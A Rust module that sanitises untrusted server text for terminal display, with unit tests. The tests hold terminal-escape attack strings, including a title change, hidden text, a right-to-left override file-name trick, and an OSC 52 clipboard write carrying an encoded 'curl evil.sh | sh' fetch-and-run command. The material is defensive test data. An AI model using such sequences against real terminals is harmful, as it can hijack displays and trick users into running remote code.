//! Text from the other side, made safe to show (security.md 4.6): a server's error messages,
//! session names and commands, a remote doctor report, reach the user's terminal only through
//! [`sanitize`], so that they cannot move the cursor, change the title, write the clipboard
//! (OSC 52), hide text or answer queries.

/// The longest text [`sanitize`] keeps by default, in characters.
pub const MAX_TEXT: usize = 1024;

/// `text` without terminal escape sequences (ESC and what follows it: CSI, OSC, DCS, SOS, PM,
/// APC up to their terminator, or one character), with every other control character (C0, DEL,
/// C1) and every bidirectional formatting character (which can reorder what is shown, "Trojan
/// source") replaced by `?`, tabs and line ends by a space, and at most `max` characters (an
/// ellipsis marks a cut).
pub fn sanitize(text: &str, max: usize) -> String {
    let mut out = String::with_capacity(text.len().min(max * 4));
    let mut chars = text.chars().peekable();
    let mut count = 0;
    while let Some(c) = chars.next() {
        let replacement = match c {
            '\u{1b}' => {
                skip_escape(&mut chars);
                continue;
            }
            // C1 introducers of strings and of CSI: their content goes too
            '\u{90}' | '\u{98}' | '\u{9d}' | '\u{9e}' | '\u{9f}' => {
                skip_string(&mut chars);
                continue;
            }
            '\u{9b}' => {
                skip_csi(&mut chars);
                continue;
            }
            '\t' | '\n' | '\r' => ' ',
            c if c.is_control() => '?',
            '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' | '\u{200e}' | '\u{200f}' | '\u{061c}' => '?',
            c => c,
        };
        if count == max {
            out.push('…');
            break;
        }
        out.push(replacement);
        count += 1;
    }
    out
}

type Chars<'a> = std::iter::Peekable<std::str::Chars<'a>>;

/// After ESC: the rest of the sequence.
fn skip_escape(chars: &mut Chars<'_>) {
    match chars.next() {
        Some('[') => skip_csi(chars),
        Some(']' | 'P' | 'X' | '^' | '_') => skip_string(chars),
        // ESC with intermediate bytes (charset designations and the like), then a final byte
        Some(c) if ('\u{20}'..='\u{2f}').contains(&c) => {
            while let Some(&c) = chars.peek() {
                chars.next();
                if !('\u{20}'..='\u{2f}').contains(&c) {
                    break;
                }
            }
        }
        _ => {}
    }
}

/// A control sequence: parameters and intermediates up to a final byte (0x40–0x7E).
fn skip_csi(chars: &mut Chars<'_>) {
    for c in chars.by_ref() {
        if ('\u{40}'..='\u{7e}').contains(&c) || !(' '..='~').contains(&c) {
            break;
        }
    }
}

/// A control string (OSC, DCS, SOS, PM, APC): up to BEL, ST (ESC \ or U+009C) or the end.
fn skip_string(chars: &mut Chars<'_>) {
    while let Some(c) = chars.next() {
        match c {
            '\u{07}' | '\u{9c}' => break,
            '\u{1b}' => {
                if chars.peek() == Some(&'\\') {
                    chars.next();
                }
                break;
            }
            _ => {}
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Review L3: what a server sends is shown as text, never acted on by the terminal.
    #[test]
    fn escape_sequences_and_controls_never_pass() {
        let cases = [
            ("plain text: ok", "plain text: ok"),
            ("\u{1b}[2J\u{1b}[Hcleared", "cleared"),
            ("title\u{1b}]0;pwned\u{7}!", "title!"),
            ("clip\u{1b}]52;c;Y3VybCBldmlsLnNoIHwgc2g=\u{1b}\\board", "clipboard"),
            ("a\u{1b}[8mhidden\u{1b}[0mb", "ahiddenb"),
            ("dcs\u{1b}P1$qm\u{1b}\\ end", "dcs end"),
            ("c1\u{9b}31mred", "c1red"),
            ("osc8\u{9d}8;;http://x\u{9c}link", "osc8link"),
            ("bell\u{7} del\u{7f} nul\u{0}", "bell? del? nul?"),
            ("two\nlines\r\tx", "two lines  x"),
            ("rlo\u{202e}txt.exe", "rlo?txt.exe"),
            ("esc at the end\u{1b}", "esc at the end"),
            ("\u{1b}(Bcharset", "charset"),
            ("unterminated \u{1b}]52;c;AAAA", "unterminated "),
            ("über 日本", "über 日本"),
        ];
        for (input, expected) in cases {
            assert_eq!(sanitize(input, MAX_TEXT), expected, "{input:?}");
        }
        assert_eq!(sanitize("abcdef", 3), "abc…");
        assert_eq!(sanitize("abc", 3), "abc");
        let long = "x".repeat(10 * MAX_TEXT);
        assert_eq!(sanitize(&long, MAX_TEXT).chars().count(), MAX_TEXT + 1);
    }
}
